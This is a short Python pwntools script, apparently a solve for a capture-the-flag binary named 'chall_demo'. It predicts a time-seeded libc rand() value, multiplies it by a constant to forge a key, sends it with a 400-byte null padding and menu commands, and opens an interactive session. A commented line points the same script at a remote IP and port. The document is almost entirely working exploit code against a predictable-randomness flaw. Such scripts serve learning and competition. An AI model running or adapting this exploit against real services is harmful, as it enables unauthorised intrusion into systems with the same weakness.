from pwn import *
from ctypes import CDLL

context.binary = binary = ELF('./chall_demo', checksec=False)
# context.log_level = 'debug'

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

r = process()
# r = remote('194.31.53.241',13337)

# Step 1: Seed libc rand with current time
seed = libc.time(0)
libc.srand(seed)

# Step 2: Compute the expected seed used in the challenge

# Step 3: Interact properly with the binary
r.sendline("DEMO_KEY")   
nhonks = libc.rand() * 0x59454b5f4f4d4544
nhonks &= 0xffffffffffffffff  # important!
# sleep(5)      # optional, if needed
r.sendline("MSG")              # trigger menu_msg()

# sleep(3)                       # optional sync if needed

# Send the correct seed
r.sendline(hex(nhonks))        # send hex string with \n
r.sendline(b"\x00" * 400)
r.sendline("GET")
r.sendline("0x0")

# Send your message payload
# r.sendline(b"A" * 64)          # adjust this for overflow tests etc.

# Step 4: Get response
r.interactive()
